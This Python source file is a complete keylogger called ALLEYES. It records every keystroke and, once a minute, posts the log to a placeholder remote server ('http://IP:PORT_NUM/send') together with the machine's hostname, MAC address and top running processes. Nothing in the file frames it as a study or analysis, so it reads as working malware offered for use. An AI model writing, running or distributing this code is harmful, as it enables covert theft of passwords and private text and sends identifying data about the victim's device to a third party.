import keyboard
from datetime import datetime
from threading import Timer
import requests
import json
import socket 
import uuid
import psutil
import time    

class ALLEYES:
    def __init__(self):
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def sendData(self, string1):
        try:
            username1 = socket.gethostname()
        except:
            username1 = 'unidentified devices'
        try:
            cmid = hex(uuid.getnode())
            print(cmid)
        except:
            cmid = '0'
        url = 'http://IP:PORT_NUM/send'
        epoch_time = int(time.time())
        processlist=list()
        for process in psutil.process_iter():
            tmplist = list()
            tmplist.append(process.name())
            tmplist.append(process.memory_percent())
            tmplist.append(epoch_time - process.create_time())
            processlist.append(tmplist)
        processlist.sort(key=lambda x: -x[1])
        processlist = processlist[0:10]
        # print(type(processlist))
        # print(processlist[0][2])
        data = {
            'username': username1,
            'mac' : cmid,
            'key': 1,
            'string': string1,
            'processlist' : str(processlist),
        }
        # print(data)
        headers = {'Content-type': 'application/json'}
        try:
            response = requests.post(url, data=json.dumps(data), headers=headers)
        except:
            response = 'googoogaga'
        print('sending data:')
        print(response)
        # print(response.text)
        # print('hello')


    def keys(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def newfilename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f'keylog-{start_dt_str}_{end_dt_str}'

    def saving(self):
        self.sendData(self.log)
        self.log = ""

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.newfilename()
            self.saving()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=60, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.keys)
        self.report()
        keyboard.wait()

def main():
    klgr = ALLEYES()
    klgr.start()

if __name__ == "__main__":
    main()
